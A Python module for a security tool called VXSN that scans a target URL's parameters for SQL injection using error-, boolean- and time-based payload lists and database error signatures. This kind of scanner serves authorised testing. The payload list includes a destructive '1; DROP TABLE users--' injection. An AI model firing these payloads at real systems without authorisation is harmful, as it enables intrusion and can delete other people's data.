#!/usr/bin/env python3
# modules/sqli.py — SQL Injection scanner for VXSN

import time
import urllib.parse
from modules.base import BaseModule
from utils.colors import Colors, print_status, print_finding, print_section

# ── Payloads ──────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "1'",
    "1\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin'--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1",    "1 AND 1=2"),
    ("' OR 1=1--",   "' OR 1=2--"),
]

TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:5'--",    5, "MSSQL"),
    ("'; SELECT SLEEP(5)--",          5, "MySQL"),
    ("1; SELECT pg_sleep(5)--",       5, "PostgreSQL"),
    ("1 OR SLEEP(5)",                 5, "MySQL"),
    ("' OR SLEEP(5)--",               5, "MySQL"),
]

# ── Error signatures ──────────────────────────────────────────────

ERROR_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "you have an error in your sql",
    "ora-",
    "oracle error",
    "microsoft sql",
    "odbc sql server",
    "sqlite_exception",
    "pg_query",
    "postgresql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "division by zero",
    "unterminated string constant",
]


class SQLiScanner(BaseModule):

    NAME        = "vuln/sqli"
    DESCRIPTION = "SQL Injection detection — error-based, boolean-based, time-based"
    SEVERITY    = "HIGH"
    REFERENCES  = [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://portswigger.net/web-security/sql-injection",
    ]

    def _define_options(self):
        self._add_option("TARGET",  "",      True,  "Target URL (e.g. https://site.com/page.php?id=1)")
        self._add_option("PARAM",   "",      False, "Specific parameter to test (default: all)")
        self._add_option("METHOD",  "GET",   False, "HTTP method: GET or POST")
        self._add_option("TIMEOUT", "10",    False, "Request timeout in seconds")
        self._add_option("DELAY",   "0",     False, "Delay between requests in seconds")
        self._add_option("LEVEL",   "1",     False, "Test level: 1=error, 2=+boolean, 3=+time-based")

    # ── Run ───────────────────────────────────────────────────────

    def run(self) -> list:
        if not self._validate():
            return []

        target  = self.get_option("TARGET").strip()
        method  = self.get_option("METHOD").upper()
        level   = int(self.get_option("LEVEL") or 1)
        self.client = self._init_client()

        params = self._extract_params(target, method)
        if not params:
            print_status("No parameters found in target URL. Set PARAM manually.", "warn")
            return []

        specific = self.get_option("PARAM")
        if specific:
            params = {k: v for k, v in params.items() if k == specific}

        print_section(f"SQLi Scan — {target}")
        print_status(f"Parameters : {Colors.WHITE}{list(params.keys())}{Colors.RESET}", "info")
        print_status(f"Method     : {Colors.WHITE}{method}{Colors.RESET}", "info")
        print_status(f"Level      : {Colors.WHITE}{level}{Colors.RESET}", "info")
        print()

        findings = []

        for param in params:
            print_status(f"Testing parameter: {Colors.CYAN}{param}{Colors.RESET}", "run")

            # Level 1 — Error-based
            f = self._test_error(target, params, param, method)
            if f:
                findings.append(f)
                continue

            # Level 2 — Boolean-based
            if level >= 2:
                f = self._test_boolean(target, params, param, method)
                if f:
                    findings.append(f)
                    continue

            # Level 3 — Time-based
            if level >= 3:
                f = self._test_time(target, params, param, method)
                if f:
                    findings.append(f)

        print()
        if findings:
            print_status(f"Found {Colors.RED}{len(findings)}{Colors.RESET} SQLi vulnerability(ies).", "ok")
        else:
            print_status("No SQL injection vulnerabilities detected.", "safe")

        return findings

    # ── Test methods ──────────────────────────────────────────────

    def _test_error(self, url, params, param, method) -> dict | None:
        base_url = url.split("?")[0] if "?" in url else url
        for payload in ERROR_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload
            code, body, _ = self._request(base_url, test_params, method)
            if code == 0:
                continue
            body_lower = body.lower()
            for sig in ERROR_SIGNATURES:
                if sig in body_lower:
                    f = self._finding("SQL Injection (Error-based)", url, param, payload,
                                      evidence=f"Error signature: '{sig}'")
                    print_finding(f["type"], url, param, payload, f["severity"], f["evidence"])
                    return f
        return None

    def _test_boolean(self, url, params, param, method) -> dict | None:
        base_url = url.split("?")[0] if "?" in url else url
        for true_pl, false_pl in BOOLEAN_PAIRS:
            test_true  = dict(params); test_true[param]  = true_pl
            test_false = dict(params); test_false[param] = false_pl
            _, body_true,  _ = self._request(base_url, test_true,  method)
            _, body_false, _ = self._request(base_url, test_false, method)
            if not body_true or not body_false:
                continue
            # Significant length difference suggests boolean behaviour
            diff = abs(len(body_true) - len(body_false))
            if diff > 50:
                f = self._finding("SQL Injection (Boolean-based)", url, param, true_pl,
                                  evidence=f"Response length diff: {diff} chars")
                print_finding(f["type"], url, param, true_pl, f["severity"], f["evidence"])
                return f
        return None

    def _test_time(self, url, params, param, method) -> dict | None:
        base_url = url.split("?")[0] if "?" in url else url
        for payload, expected_delay, db in TIME_PAYLOADS:
            test_params = dict(params)
            test_params[param] = payload
            start = time.time()
            self._request(base_url, test_params, method)
            elapsed = time.time() - start
            if elapsed >= expected_delay * 0.8:
                f = self._finding("SQL Injection (Time-based)", url, param, payload,
                                  evidence=f"Response took {elapsed:.1f}s — db: {db}")
                print_finding(f["type"], url, param, payload, f["severity"], f["evidence"])
                return f
        return None

    # ── Helpers ───────────────────────────────────────────────────

    def _request(self, url, params, method):
        if method == "POST":
            return self.client.post(url, data=params)
        return self.client.get(url, params=params)

    def _extract_params(self, url: str, method: str) -> dict:
        if "?" in url:
            qs = url.split("?", 1)[1]
            return dict(urllib.parse.parse_qsl(qs))
        return {}
